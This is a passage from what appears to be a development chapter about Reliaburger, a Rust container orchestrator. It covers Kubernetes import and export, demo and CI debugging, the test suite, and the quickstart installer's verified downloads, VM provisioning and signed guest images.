CRDs, ServiceAccounts, PodDisruptionBudgets, RBAC — these either have no equivalent or are handled automatically by Reliaburger (SPIFFE replaces ServiceAccounts, deploy config replaces PDBs). The report tells you exactly what to review.

### Skipping the TOML

Import-then-apply is two commands and a file you didn't want. So `relish apply` takes Kubernetes YAML directly, from a path or an `https://` URL:

```sh
relish apply -f https://reliaburger.com/demo/podinfo.yaml
```

How does it know? A top-level `apiVersion:` line isn't valid TOML, so a document with `apiVersion:` and `kind:` at the start of a line can only be Kubernetes. That document goes through the same importer in memory, its migration report still lands on stderr (applying mustn't hide what it approximated), and the resulting `Config` is validated and applied like any TOML file.

The download is where a convenience turns into an attack surface, so it's deliberately narrow: HTTPS only (redirects too, via reqwest's `https_only`), a 30-second timeout and a 1 MiB cap enforced while reading, not just from the `Content-Length` header a server can lie about. The CLI accepts the manifest positionally or with `-f`, and clap's `ArgGroup` makes exactly one of them required:

```rust
#[command(group(clap::ArgGroup::new("manifest").required(true)))]
Apply {
    #[arg(group = "manifest")]
    path: Option<String>,
    #[arg(short = 'f', long = "file", group = "manifest")]
    file: Option<String>,
    // ...
}
```

A group is clap's way of saying "these arguments are alternatives": `required(true)` demands one, and membership in the group makes any two of them a usage error. The compiler can't express "exactly one of two `Option`s is `Some`" in the type, so clap checks it at parse time and the handler can rely on it.

### A demo that has to keep working

A migration story needs a real application to migrate, not a toy we wrote to pass. We picked podinfo in its three-tier shape: a frontend that calls a backend through `--backend-url=http://backend:9898/echo` and caches in redis through `--cache-server=tcp://redis:6379`. It's a widely used Kubernetes demo, and it leans on everything this chapter and the first one promise: the podinfo image runs `./podinfo` as user `app` from `/home/app`, the official Redis image needs its entrypoint to run as root and drop privileges, and both talk to each other by short Kubernetes names.

`examples/kubernetes/podinfo.yaml` keeps as close to upstream as we could and lists every edit in its header: images pinned by digest (redis from the ECR mirror to dodge Docker Hub rate limits), no `webapp` namespace or service account, HTTP probes instead of `exec: podcli check http`, three frontend replicas, redis's config file turned into arguments, and an ingress on `podinfo.localhost`. The import report still lists what it can't keep, and that's the point.

Two tests hold it in place. A portable one imports the file and checks the three apps it should produce. A provisioned-Linux one starts a real Bun with runc, eBPF, the DNS responder and ingress, runs `relish apply -f` on the file, and then goes through the ingress by host name: the home page must answer, `POST /api/echo` must come back as the backend's list of responses, and a value written to `/cache/demo` must read back from redis.

It paid for itself on its first run. Every image the node's Pickle cache served failed with `digest mismatch for layer sha256:8d0c5e505441...: expected sha256:8d0c5e505441..., got sha256:8d0c5e5054411ef2...`. The two digests were the same; one of them had been printed. The cluster image source passed the config blob's digest along with `to_string()`, and `Digest`'s `Display` impl abbreviates to twelve hex digits for humans. In Rust, `Display` is the trait behind `{}` and `to_string()`, and nothing stops a type from making it lossy. The fix was `as_str()`, and the pickle suite now re-hashes the config blob against the digest it returns. Unit tests of the pull path never noticed, because they went round the cluster source rather than through it.

It paid again on its first CI run, less politely. It passed in our VM and failed on GitHub's runner with `frontend never reached the backend by name`, followed by Bun's startup log and nothing else. Were the containers even running? The test couldn't say, so the first fix was to the test: a failure now prints the last answer it got through the ingress, every instance's state, each app's logs, every runtime command's stderr, `runc list`, the kernel, runc version and user-namespace sysctls, and the host's FORWARD chain.

The frontend answering while the backend stayed out of reach was already a hint. Container to container traffic leaves one veth and enters another, so the host *forwards* it, and GitHub's runner has Docker installed. Docker sets the iptables FORWARD policy to DROP (so does ufw). Setting `iptables -P FORWARD DROP` in the VM reproduced the failure, and this time the test explained itself: all five containers running, the frontend's log saying `dial tcp 127.128.202.174:6379: i/o timeout`. Name resolution worked. The packets died between two containers. We couldn't fix it in our own nftables table, because netfilter doesn't work that way: an accept in one table just hands the packet to the next table on the same hook, and a drop anywhere is final. So `setup_container_network` now makes sure iptables' own FORWARD chain accepts what our `veth-…` interfaces send, and replies or DNATed published-port traffic towards them, ahead of whatever policy the host has. Every Ubuntu box with Docker or ufw would have hit this on day one. Better it was a CI runner.

### Export: the reverse direction

`relish export` reads a TOML config and produces multi-document K8s YAML. Each app becomes a Deployment + Service (or DaemonSet). Ingress, HPA, ConfigMap, and Secret resources are added when the relevant config sections exist.

Features with no K8s equivalent show up in the export report: `auto_rollback`, Smoker fault rules, process workloads, build jobs, `run_before` dependency ordering. The report suggests K8s alternatives where they exist (Argo Workflows for dependency ordering, NetworkPolicy for firewall rules).

#### Two ways to not export something

Reporting the unsupported features felt like the job was done. It wasn't, because it answered the wrong question. The report listed what Kubernetes *can't* express — and said nothing about what this exporter simply hadn't got round to.

Ten field families fell into that gap. `namespace`, `command`, `memory`, `cpu`, `gpu`, `health`, `volumes`, `init`, `config_file`, `placement`. Every one has a perfectly ordinary Kubernetes equivalent. Every one was dropped in silence, so the YAML looked complete and described a materially different workload.

Two of those are worth sitting with:

**`namespace`.** Dropped, so every resource landed in `default`. Two teams' apps called `web` collapsed into one — the exact collision instance identity fixed *inside* Reliaburger (chapter 2), reintroduced on the way out. And because the Service lost its namespace too, it would have gone looking for pods in `default` and found nothing. A migration that silently merges tenants is not a migration.

**`memory`/`cpu`.** Dropped, so a 512Mi-limited app exported as an unlimited pod. Kubernetes' scheduler would then place a workload it believed was free. This one's translation is unusually clean, because `ResourceRange` already carries a request *and* a limit:

```rust
if let Some(memory) = &app.memory {
    requests.insert("memory".to_string(), quantity(memory.request.to_string()));
    limits.insert("memory".to_string(), quantity(memory.limit.to_string()));
}
```

Two fields on each side, same meaning. Most of this exporter is lossy; it's nice when something isn't.

The remaining five are still not translated, and that's a defensible place to stop — they're real work, not a docs fix. What isn't defensible is saying nothing, so they go in a `dropped` list that is deliberately *not* the `unsupported` list:

```
Unsupported (no K8s equivalent):
  - [app.web.firewall] — use NetworkPolicy manually

Not exported yet (a K8s equivalent exists):
  ! [app.web] health — has a K8s equivalent (livenessProbe/readinessProbe) but is not exported yet
```

The distinction matters to the person reading it. "Unsupported" tells them to stop looking; "not exported yet" tells them a solution exists and they'll have to write it by hand today. Filing the second under the first is a small lie that costs someone an afternoon.

There's a general principle in here that keeps recurring in this project: an incomplete tool that reports its gaps is trustworthy, and a tool that quietly does less than it claims isn't — regardless of which one has more features.

#### The second pass: the bugs the first pass planted

A later line-by-line audit of both converters found another crop, and they're instructive because most of them are *consistency* failures — one code path fixed, its sibling left behind.

The export side first. The M28 pass added the namespace to every resource's metadata... except the Ingress, the one resource that referenced another by name. A namespaced app's Ingress landed in `default` and pointed at a Service that wasn't there. The job exporter kept only image and command, so a migration job's database credentials and memory limit vanished — the same env/resources mapping the app exporter had, sitting thirty lines up, unused. And the namespace exporter accepted a `NamespaceSpec` full of quota fields, ignored the argument entirely (`_ns`, the underscore quietly telling you it was never read), and emitted a bare Namespace while the module doc promised a ResourceQuota.

Two smaller export bugs had sharper teeth. A DaemonSet app with `[autoscale]` produced an HPA whose `scaleTargetRef` said `kind: Deployment` — pointing at a resource that doesn't exist, because the HPA block sat outside the branch that knew which kind it had emitted. And the autoscale target parser accepted only `"70%"`, while config validation also accepts the fraction form `"0.7"` — which exported as `type: Utilization` with no `averageUtilization`, a manifest the API server rejects. Both are now report entries instead of broken YAML: a DaemonSet can't be scaled (no scale subresource), so the honest output is no HPA and a sentence saying why.

The import side had the best bug of the batch. Kubernetes denominates CPU in *cores*: `cpu: "1"` means one core. Reliaburger denominates in millicores, and its own `ResourceRange` parser reads a bare integer as exactly that. Feed the K8s string to the Reliaburger parser — which is what the importer did — and `cpu: "1"` imports as one *millicore*. A thousand-fold under-read, and nothing said so, because the parse error path was `.ok()` and the values that did parse were silently wrong. The importer now has real K8s quantity parsers (cores to millicores, the full suffix zoo for memory), reads `requests` as well as `limits` (a requests-only Deployment — the common case — used to import with no resources at all), and warns on anything unparseable.

The rest of the import crop was the same shape as the export's: DaemonSets and StatefulSets kept only four fields while Deployments kept fourteen, fixed by extracting the shared `pod_spec_to_app` helper rather than copying the logic twice more. The HPA lookup keyed on the HPA's *own* name, so the conventional `api-hpa` → `api` pairing never matched and autoscaling silently disappeared — the comment above the lookup said "correlate by scaleTargetRef name", which is what it should have done and now does. And an Ingress or HPA that correlated with nothing just vanished, while ConfigMaps and Secrets got report entries — the sweep now covers all four.

Can you see the pattern? Almost none of these were hard to fix. They existed because the correct code was written once, for the most common kind, and the other kinds were stubbed "for now". If you take one habit from this section: when you fix a mapping for Deployments, grep for the sibling that handles DaemonSets before you close the ticket.

## Lessons learned

**The mock driver refactor was worth it.** When we added blue-green deploys, the existing `MockDriver` broke. It tracked steps by counting `stop_instance` calls, which worked for rolling (one stop per step). In blue-green, all starts happen before any stops. The fix: separate counters for start and health check calls. A small change, but it highlighted why the mock should model *operation counts*, not *lifecycle phases*.

**Hysteresis is not optional.** The first autoscaler version scaled down as soon as the metric dropped below target. It oscillated wildly. CPU drops, scale down, CPU spikes, scale up, CPU drops, scale down. The hysteresis threshold (scale down only below target * 0.8) eliminated the oscillation. The cooldown (3 minutes between scale events) added stability. Both are required. Neither is clever -- they're standard control theory, applied.

**`toml_edit` was overkill for formatting.** We initially used `toml_edit` to preserve comments during formatting. It works, but the comment-preserving reserialisation introduced subtle ordering bugs that were painful to debug. We switched to a simpler approach: parse with `toml`, reserialise with canonical section ordering, accept that comments are lost. For machine-generated configs (which is what `relish compile` produces, and what Lettuce processes), comment loss is irrelevant. For hand-edited configs, `relish lint` validates without reformatting.

**WebSocket is 95% detection, 5% proxying.** We spent most of the time on header detection edge cases (case-insensitive matching, multi-value Connection headers, routes that don't opt in). The actual proxying -- connect to backend, forward upgrade, bidirectional copy -- is straightforward. The drain Close frame is 4 bytes of hand-built binary (built and tested, though not yet sent on the live drain path -- see above). No WebSocket library needed.

**Coordinator election should be boring.** Our first design for Lettuce's coordinator election had scoring heuristics: CPU load, memory availability, network latency to the git remote. We replaced it with "first non-leader alphabetically." It's deterministic, requires no measurement, and produces the same result on every node without communication. The scoring approach might produce slightly better placement, but the added complexity wasn't worth it for a role that does one git fetch every 30 seconds.

**`skip_serializing_if` is not optional for config output.** The first version of `relish compile` and `relish import` produced TOML with dozens of empty sections: `[app.web.env]` with nothing in it, `command = []`, `config_file = []`, `[job]`, `[namespace]`, `[permission]`, `[build]`. Every `#[serde(default)]` field got serialised to its default value. The fix was adding `#[serde(skip_serializing_if = "Vec::is_empty")]` and friends to every collection and Option field on `AppSpec`, `JobSpec`, and `Config`. One attribute per field, mechanical work, but the output went from 30 lines of noise per app to just the fields that matter.

**Defaults must cascade.** The first `relish compile` applied `_defaults.toml` only to files in the same directory. A config structure with `configs/_defaults.toml` and `configs/backend/api.toml` wouldn't inherit the defaults into the subdirectory. The fix was passing the parent's defaults into the recursive call, with the child's own `_defaults.toml` taking priority if present. The bug was invisible in unit tests (which tested flat directories) and only showed up in the demo script, which was the first time anyone tried a nested directory structure. Write your demo scripts early.

**Five levels of `if let Some` is the price of K8s correctness.** The k8s-openapi crate is faithful to the Go API, where every field is a pointer and might be nil. In Rust, that becomes deeply nested `Option` chains. You can flatten them with helper functions, but the navigation code still reads like an archaeological dig through layers of optionality. The alternative -- hand-rolled structs with `#[serde(default)]` on everything -- trades correctness for readability. We picked correctness and accepted the nesting.

## Tests

Six features, and nearly all of them turn out to be pure functions hiding inside an operational story. `compute_desired` is arithmetic. `is_websocket_upgrade` reads headers. `select_coordinator` sorts a list. The blue-green orchestrator runs against the same `MockDriver` from Chapter 7. So Phase 9 is, once again, mostly unit tests — 117 of them.

### Unit tests by feature

- **Blue-green** — the orchestrator against `MockDriver` (6), plus the new state-machine transitions (`StartingGreen`, `HealthCheckingGreen`, `RoutingSwitching` and their failure paths, 7). The mock had to be refactored to count operations rather than lifecycle phases — see the lessons below.
- **Autoscaling** — `compute_desired` with hysteresis and cooldown is the heart of it (12 tests covering scale-up, scale-down-only-below-threshold, clamping to min/max, oscillation), plus config parsing and the `AutoscaleTracker` baseline/override logic (6).
- **WebSocket** — header detection edge cases (case-insensitive, multi-value `Connection`, opt-in routes) and the 4-byte close frame (8).
- **Config tooling** — compilation and defaults merging (7), `fmt` idempotency and section ordering (4), structural `diff` (8).
- **Lettuce** — types serde (4), git clone/fetch/list (4), webhook HMAC/replay/rate-limit (7), autoscaler-aware diff (7), sync-loop TOML parsing (3), coordinator election (5), signature verification (1).
- **Kubernetes** — import (10) and export (6).

### Feature-gated: Kubernetes import/export

The one gated path in this chapter isn't an environment variable — it's a Cargo feature. K8s import/export pulls in `k8s-openapi`, a heavy dependency most users don't need, so it sits behind a `kubernetes` feature that's *on by default*:

```toml
[features]
default = ["kubernetes"]
kubernetes = ["dep:k8s-openapi"]
```

A plain `cargo test` therefore compiles and runs the K8s tests. If you want to prove the rest of the binary builds and tests *without* that dependency — smaller, faster, no `k8s-openapi` — drop the default features:

```sh
cargo test --no-default-features    # everything except K8s import/export
```

The import/export modules themselves are `#[cfg(feature = "kubernetes")]`, so they simply vanish from the build when the feature is off, and so do their tests.

### Demos: the end-to-end round-trips

Two of this chapter's features are best seen as round-trips, so there's a script for each:

```sh
make toml-demo          # compile -> fmt -> diff -> lint over a sample config tree
make kubernetes-demo    # import K8s YAML to TOML and export it back
```

`kubernetes-demo` is the honest test of the migration story: take real Kubernetes YAML, import it, look at the TOML and the migration report, export it again, and check the round-trip is sane. The correlation logic (Service → Deployment → Ingress → HPA) is exactly what unit tests struggle to cover convincingly, because the interesting bugs are in how resources *fit together*, not in any one conversion.

### Running them

```sh
cargo test --lib meat::blue_green meat::autoscaler   # deploy + scaling
cargo test --lib lettuce                             # GitOps engine
cargo test --lib wrapper                             # WebSocket proxying
cargo test --no-default-features                      # prove it builds without K8s
make toml-demo && make kubernetes-demo                # end-to-end round-trips
```

Phase 9 adds 117 tests, bringing the total to 1380.

## Release integration: keep the laptop outside the VM

After creating a local cluster, `relish status` should work from your terminal.
Asking you to enter a VM just to reach the API leaves half the setup unfinished.
The managed context records the forwarded HTTPS endpoint, its cluster CA and an
administrator bearer in `~/.reliaburger/context.json`.

That file contains a credential. Writes use mode 0600 and atomic replacement;
reads refuse group- or world-readable files. A file lock serialises writers, and
an ownership identifier prevents one cluster operation from replacing another's
context. Rust releases the lock when its `File` leaves scope, including early
error returns. The context deliberately doesn't derive `Debug`: accidentally
printing a struct mustn't print its bearer.

Explicit endpoint flags bypass the saved context credentials. Otherwise, normal
CLI commands use the context, while explicit token and CA settings remain
operator overrides. A malformed context produces an error instead of quietly
connecting to an unrelated service on the old default port. Tests cover private
round trips, conflicting owners, bad schema/transport, exposed permissions and
an absent context.

HTTP and WebSockets share the same cluster trust policy. Both verify certificate
chains and handshake signatures against only the saved cluster CAs. They omit
DNS-name checking because a forwarded loopback address doesn't match a node's
certificate name. Rustls performs the certificate and signature verification;
we supply the trust anchors and policy. Live TLS tests prove both that the
right CA works and that an unrelated CA fails. WebSocket connection setup also
has a deadline, so a stalled handshake can't hang the TUI indefinitely.

### Resume the operation, don't create a second cluster

Quickstart records its ownership identifier and all VM names before it runs a
VM command. A retry opens the same checkpoint under an exclusive file lock.
Changing the requested version, node count or ports is an error; a retry isn't
an implicit upgrade or resize. VM names include the ownership identifier, and
state validation refuses unrelated names before lifecycle commands can use them.

Bootstrap preparation follows the same rule. We generate the CA hierarchy,
first node identity, master key and administrator token in a private staging
directory, then rename the complete bundle into place. A retry validates that
bundle and reuses it. A missing commit marker, mismatched CA or wrong master key
is an error, never a reason to generate another identity for running VMs.

Checkpoints use the durable writer described in Chapter 4. Async callers send
writes to Tokio's blocking pool. An `Arc<File>` keeps the operation lock alive
until a write finishes, even if its awaiting task is cancelled. The tests cover
exclusive writers, stable identity and names, changed parameters, invalid
ownership, private bootstrap files and damaged bundles.

### Download before you trust, verify before you replace

The installer needs a guest image and prebuilt binaries. A partial download
mustn't become tomorrow's cached executable. The downloader streams each body
to a private `<name>.partial` file beside its destination, checks a running
SHA-256 digest, flushes it, and renames it into place. A bad checksum leaves an
existing file untouched. Cached files get checked again before reuse.

Our first downloader gave each request 180 seconds, body included. That sounds
generous until you do the arithmetic: the Ubuntu image is about 600 MB, so any
link slower than about 27 Mbit/s failed every time, and each retry started from
zero. A time limit on the whole transfer can't tell a slow link from a dead one.
What we actually want to detect is a transfer that has stopped. So each chunk
now has 30 seconds to arrive (`tokio::time::timeout` around `response.chunk()`),
and there's no limit on a transfer that keeps moving.

When a transfer does stop, or you press Ctrl-C, the partial file stays. The
next run hashes what's there, asks for the rest with an HTTP `Range:
bytes=N-` header, and appends. If the server answers `206 Partial Content`
starting at exactly our offset, we carry on; if it ignores the range and sends
the whole file with `200`, we truncate and start again. Either way the digest
covers every byte of the final file, so a resumed download is trusted exactly
as much as a fresh one. A partial whose final digest is wrong gets deleted,
because retrying from the same bytes can never succeed. We mark that case with
a tiny `thiserror` type, `Unrecoverable`, and check for it with anyhow's
`downcast_ref`, which asks an `anyhow::Error` whether it wraps a particular
concrete error type. It's Rust's rough equivalent of Go's `errors.As`.

Size limits apply both to the
advertised length and the bytes actually received, so chunked responses don't
bypass them. Redirects must keep using HTTPS, and URLs can't contain credentials.
Loopback HTTP is allowed only in test builds for the local fixture server.
Release metadata has its own smaller limit and an explicit schema check.
Checksum verification protects transfer integrity; the release signature remains
a separate check before executing a downloaded Reliaburger binary.

VM configuration disables host directory mounts and automatic port forwarding.
Only the API ports and the first node's HTTP ingress get loopback forwards.
Nodes use the shared guest network for authenticated cluster traffic, with a
rootful runc runtime and embedded eBPF. The DNS listener binds that shared IP,
leaving Ubuntu's loopback resolver alone. Systemd owns the agent process and
its journal instead of a detached shell process with an uncertain lifetime.

A join token can now come from `relish join --token-file`. It must be a small,
nonempty, owner-only file. This lets provisioning hand the token to the guest
without exposing it in the host or guest process arguments.
The existing `--token` option remains available for manual use. Clap enforces
that you supply exactly one source; both routes use the same pinned-CA join.

### Put the steps together

`setup --quickstart` used to wrap the whole operation in one five-minute
deadline. That deadline guards against a setup that hangs, but downloads made
it a guard against slow networks too: at 20 Mbit/s the image alone takes four
minutes. Now the five minutes cover what we control, from the first VM boot to
the ingress probe. Downloads get the stall detection above and a separate
30-minute backstop, and since partial files survive, running out of time costs
nothing but the wait. Each completed external step gets a durable checkpoint. Our first version
booted VM 1 alone, because concurrent first boots corrupted Lima's shared SSH
key, and only then started the others. That cost a whole boot, 40 seconds or
more. Reading Lima 2.1.0's source showed why: `limactl start` checks whether
`_config/user` exists, and only afterwards takes a lock and runs `ssh-keygen`.
It never checks again under the lock, so two first starts both generate a key
and the second overwrites the first. Lima's `user-v2` network daemon has the
same check-then-lock shape.

So we remove the race instead of serialising around it. Before any VM starts,
`Lima::ensure_user_key` runs the same `ssh-keygen -t ed25519 -N "" -C lima`
into a private staging directory and renames the public half into place first,
because Lima treats the private file as proof that both exist. Then the first
`limactl start` launches the network daemon, and the others start as soon as
its PID is alive and its socket exists, a second or two later rather than a
whole boot later. All boots run through `FuturesUnordered`, a collection of
futures polled concurrently that yields results as they finish. A future is
Rust's suspended asynchronous computation; putting several in this stream lets
one VM boot while another waits for package installation. `tokio::select!`
waits for whichever comes first, the network daemon or the first boot itself
(which also covers resuming a cluster whose first VM is already running). We
persist each result before moving on. Dropping a timed-out
Lima command kills its direct child; VMs already created remain recorded for
resume or explicit cleanup.

The first node receives the saved bootstrap identity. Subsequent nodes generate
their own keys through the ordinary pinned-CA join protocol, using short-lived,
node-bound tokens. The host never invents a second CA on a retry.

Getting files into a guest used to take five `limactl` calls per file: make a
private directory, copy, `install` with a mode, rename, clean up. Each call is a
fresh SSH session, and with binaries, config, key, unit file and seven identity
files that came to about 140 calls, one node after another. Now the host writes
every file for a node into one tar stream, with root ownership and each file's
final mode in its header, and pipes it into a single `sudo sh -c` on the
guest. The `tar` crate's `Builder` writes the archive; `tempfile::tempfile()`
gives us an anonymous file to hold it, which disappears when the last handle
closes, so there's nothing to clean up on the host. The guest script unpacks
into a private staging directory, then renames each file into place in the
order we listed them. A rename is atomic, so a reader sees the old file or the
new one, never half of each; it also works when a previous attempt already
started the executable we're replacing. The identity's commit marker goes
last, as before.

Because those paths end up inside a shell script, `GuestFile` accepts only
absolute paths made of plain letters, digits, dots, dashes and underscores.
We test that the script refuses `..` and quoting tricks, and we run the real
script with `/bin/sh` against a temporary directory to check modes, order and
cleanup. The join token takes the same route: it travels on standard input into
an owner-only file that a shell `trap` removes when `relish join` finishes.

With one copy per node, the nodes themselves can go in parallel. The first
node must be ready before the others, because they enrol through it. After
that, nodes 2 and 3 install, enrol and start concurrently. They share the
operation's checkpoint file, so each future borrows the `Operation` through a
`tokio::sync::Mutex<&mut Operation>`. This is worth a second look if you're
coming from Go. The mutex doesn't own the operation; it holds a mutable
*borrow* of it. The futures aren't spawned, they're polled by a
`FuturesUnordered` inside our function, so they can borrow local variables and
the compiler proves the borrow ends before we use `operation` again. Only the
checkpoint writes take the lock; the slow work doesn't.

API readiness alone isn't the finish line. We check the running binary version,
all owned nodes, council membership and leader, then deploy a digest-pinned
BusyBox HTTP server. The last probe goes through the host ingress port and
checks the response body. Only then do we save the active host context and
print success. This is the distinction between having started processes and
having demonstrated a usable cluster. Real-VM qualification still has to prove
these steps work together, and a published candidate with empty caches must
meet the timing target before we advertise it.

The release carries its own guest images, built from the dated Ubuntu images
named in `guest-images.json` (more on that in a moment). Ubuntu can retire
older dated downloads; keeping the verified bytes with the release preserves
reproducibility. A developer can explicitly supply local Linux binaries for
testing before a release exists, but that path prints a notice and cannot
qualify the signed installer. `RELIABURGER_HOME` isolates its state from a normal installation.

Lifecycle commands hold the operation lock and use only its saved VM names.
Stopping preserves disks. Destroying requires `--yes`, removes the owned VMs,
and removes the active context only if its owner matches. We preserve the lock
file's inode: deleting it while holding the lock would let another process
create a new file at the same path and acquire a different lock.


### Progress you can trust

For a long time quickstart printed five lines in four minutes. "Preparing
verified Linux image and tooling", then nothing for two minutes while 600 MB
arrived. Is it downloading? Stuck? Would Ctrl-C lose everything? You couldn't
tell, and neither could we when we measured it.

Now every step gets a line: each download with bytes, total and speed, each VM
boot, each node's install, enrolment and start, then quorum and the demo. On a
terminal the lines redraw in place, with a status, the elapsed time and any
note such as `cached` or `already running`. In a CI log or a pipe, where
cursor movement would be garbage, each step prints once when it starts and
once when it ends. At the end comes a short "where the time went" table.

The interesting part is how a download on one Tokio task tells the display
about its bytes without anyone taking a lock. A step is an `Arc<StepState>`;
`Arc` is a reference-counted pointer that several threads can hold at once
(Go programmers get this for free from the garbage collector). Inside it the
byte counter is an `AtomicU64`, which the downloader bumps with `fetch_add` and
the display reads with `load`. Things that are set exactly once, like the total
size, a note or the finish time, live in `std::sync::OnceLock`, a cell that
can be written once and then read by anyone without locking. Rust's type
system is doing real work here. `Arc<T>` only lets you share `&T`, a shared
reference, so we *can't* mutate a plain `u64` through it. The compiler forces
us to pick a type that is safe to change through a shared reference.

The display itself runs on a plain `std::thread`, not a Tokio task. Writing to
a terminal can block, and a blocked write on a Tokio worker would stall
whatever else that worker was polling. Steps reach the thread through a
`std::sync::mpsc` channel; the thread wakes every 125 ms, drains the channel
and redraws. When setup ends it marks anything still running as `stop` rather
than leaving it spinning, and hands back every step so we can total the times.

The summary groups steps by stage and reports each stage's wall-clock span,
from its first start to its last finish. Adding up the three VM boots would
say we spent three minutes booting when we spent one; they overlap, and the
point of the summary is to say where the minutes actually went.

### Measure it, then believe it

We said quickstart took about four minutes, and that was true of one run. So
we added `--timings`, which prints every step's duration and start offset, and
made every run save the same data as `timings.json` in the cluster directory,
failed runs included. Then we ran it over and over on one M2 Max, before and
after the changes above. The numbers are in `docs/qualification/`; here's what
they taught us.

The first lesson came before the first VM. The memory preflight refused to
start three VMs on a 32 GiB Mac because it saw half a GiB available. The
`sysinfo` crate computes macOS "available" memory as free plus inactive pages,
*minus* the pages the compressor occupies. Compressed pages never counted as
free in the first place, so on a busy Mac with ten GiB compressed the result
is nearly zero while `memory_pressure` reports 60% free. We now ask the kernel
for that same figure, `kern.memorystatus_level`, and keep `sysinfo` on Linux,
where `MemAvailable` means what it says.

The second lesson was about variance. Two warm runs out of four had one VM
boot 90 seconds late. The journal showed why: our own provisioning script
restarts `systemd-logind`, and sometimes logind spins in `stop-sigterm` until
systemd's 90-second stop timeout kills it. Lima's "user session is ready"
check waits with it. A plain restart had been the fix for an earlier SSH
stall, so we kept the restart and made it brutal: kill logind first, then
start it. That's the state systemd reached anyway, 90 seconds sooner.

The third was the nastiest. Now and then a VM started and never booted:
Lima said "running", the serial console stayed completely empty, and SSH
never answered. We reproduced it with plain `limactl start` and a bare
Ubuntu image, no Reliaburger code at all, so it lives somewhere between Lima
and Apple's Virtualization.framework. We can't fix that, but we can notice
it. A healthy guest prints its login prompt within seconds, so
`start_watched` races the start command against a 60-second watchdog with
`tokio::select!`. If the console is still silent when the watchdog fires,
the `select!` drops the start future, which kills `limactl` (we built its
`Command` with `kill_on_drop(true)`), then forces the VM off and starts it
once more. Dropping a future is how you cancel it in Rust; there's no
`cancel()` method, and no context object to thread through as in Go. A resumed
setup applies the same test to a VM left "running" by an earlier attempt.

### Bake the image, don't install at boot

The measurements had one more thing to say. The kernel reached a login prompt
in 8 seconds, and then every VM sat in cloud-init for another half a minute.
Doing what? Our provisioning script ran `apt-get update` and installed runc,
uidmap and friends from Ubuntu's mirrors. That's 42 MB of package indexes per
VM, three VMs at once, on every fresh cluster, before a single container runs.
And a laptop with a flaky connection or an Ubuntu mirror having a bad day
turned into a failed setup.

The fix is old-fashioned: install the packages once, when we build the
release, and ship a disk image that already has them. We call it baking the
image (decision D4 in the plan). `scripts/release/build_guest_image.sh` takes
the pinned Ubuntu cloud image, checks its SHA-256, converts it to a raw file
and loop-mounts it. Then it `chroot`s in and runs `apt-get install`, the same
command the VM used to run at first boot. Two details keep the result small
and honest. The package indexes and downloaded `.deb` files live on a tmpfs
mounted over `/var/lib/apt/lists` and `/var/cache/apt`, so 500 MB of apt state
never touches the image. (Our first build forgot this, deleted the files
afterwards and still shipped a 796 MiB image, because ext4 doesn't hand
deleted blocks back until its journal commits, and the compressor happily
compressed the ghosts.) And before compressing, the script seals the image:
an empty `/etc/machine-id`, `cloud-init clean`, no SSH host keys. A baked
image that kept those would give three VMs the same identity, which is the
kind of bug that surfaces months later as two nodes fighting over a DHCP
lease.

We build natively on each architecture, arm64 on GitHub's arm runner and
x86-64 on the ordinary one. `virt-customize` from libguestfs is the
textbook tool, but it boots a small helper VM and wants `/dev/kvm` to do it
quickly, and a cross-architecture chroot would need `qemu-user-static` to
emulate every package script. A native chroot needs neither, and the aarch64
build takes about two minutes.

What format do we ship? Lima 2.1.0 turns a qcow2 image into the raw disk
Apple's Virtualization.framework needs, but it reads only zlib-compressed
qcow2 clusters, not zstd ones. It can decompress a `.zst` file too, but by
running a `zstd` command, and macOS doesn't have one. So we ship exactly what
Ubuntu ships, a zlib qcow2: 604 MiB, 13 MiB more than the stock image. The
download barely changes, and on the M2 Max a VM went from `limactl start` to
ready in 14–18 s instead of 31–53 s.

Here's the part that took some thought. The CLI used to have the image's
SHA-256 compiled in, from `guest-images.json`. A baked image can't work that
way. CI builds it in the same run as the CLI, and no two builds produce the
same bytes (file times and journal contents differ). So instead of pinning
the digest, we sign it. `package.py` signs a short statement per
architecture with the release key:

```text
reliaburger guest image v1
version v0.1.0
arch aarch64
asset reliaburger-guest-ubuntu-24.04-20260911-aarch64.qcow2
sha256 …
source-sha256 7b682958…
```

The CLI downloads `guest-image-metadata.json`, rebuilds that text itself and
checks the signature before it believes a single digest in the file:

```rust
impl GuestImageMetadata {
    pub fn verified(
        mut self,
        version: &BinaryVersion,
        arch: &str,
        pin: &GuestImage,
        release_keys: &[PublicKey],
    ) -> Result<BuiltGuestImage> {
        // schema, version, asset name and upstream digest checks...
        let statement = guest_image_statement(
            &version, arch, &image.asset, &image.sha256, &image.source.sha256,
        );
        // ...then the Ed25519 check, reusing the binary verifier
        verify_binary(statement.as_bytes(), &envelope, release_keys, None, false)
            .context("release guest image signature is not valid")?;
        Ok(image)
    }
}
```

`verified` takes `mut self`, not `&self`. It consumes the metadata: once
you've asked for a verified image, the unverified document is gone, moved into
the method, and the caller can't accidentally read a digest from it
afterwards. (`mut` lets the method take the image out of its own map with
`remove` instead of cloning it.) Go has no equivalent; there, the caller would
still hold the struct and nothing would stop them using it. The statement
carries the version, so an old release's genuine metadata can't be replayed
against a new CLI, and the upstream digest, so the image provably started from
the Ubuntu build we pinned. The signature covers a few hundred bytes rather
than the 604 MiB image, so the CLI never has to read the whole image into
memory to check it; the ordinary streaming SHA-256 of the download does that.

Development runs have no release to take a baked image from, so they still
boot the stock Ubuntu image. One provisioning script serves both. It counts
the installed packages and runs apt only when the count is short:

```rust
Ok(format!(
    "installed=$(dpkg-query -W -f='${{db:Status-Abbrev}}\\n' {list} 2>/dev/null \
     | grep -c '^ii' || true)\n\
     if [ \"$installed\" -ne {count} ]; then ...",
    count = packages.len()
))
```

In `format!`, `{list}` is a placeholder filled from a local variable, so a
literal brace has to be doubled: `${{db:Status-Abbrev}}` comes out as the
`${db:Status-Abbrev}` that `dpkg-query` expects. Why count instead of looking
for a missing package? `dpkg-query` prints nothing at all for a package it
has never heard of, so "is any line not `ii`?" would answer no. The package
names come from `guest-images.json`, and since they end up in a shell script
we refuse anything that isn't a plain Debian package name, even though we
wrote the file ourselves.

The test for that script doesn't grep it for strings. It runs it, with
`bash`, against a directory of stub commands put first on `PATH`: a fake
`dpkg-query` that reports every package installed except one, and a fake
`apt-get` that writes its arguments to a log. A baked image must produce an
empty log; a stock one must produce `update` and then `install` with the
whole list. `#[cfg(unix)]` on those tests compiles them only on Unix hosts,
the same attribute family as `#[cfg(test)]`, because the stubs are shell
scripts.

We didn't pre-pull the demo's container images into the guest image, though
the plan suggested it. Bun always fetches an image's manifest from the
registry, even when every layer is cached, and it trusts a cached layer by its
size alone once the file exists. Seeding its cache from outside would mean a
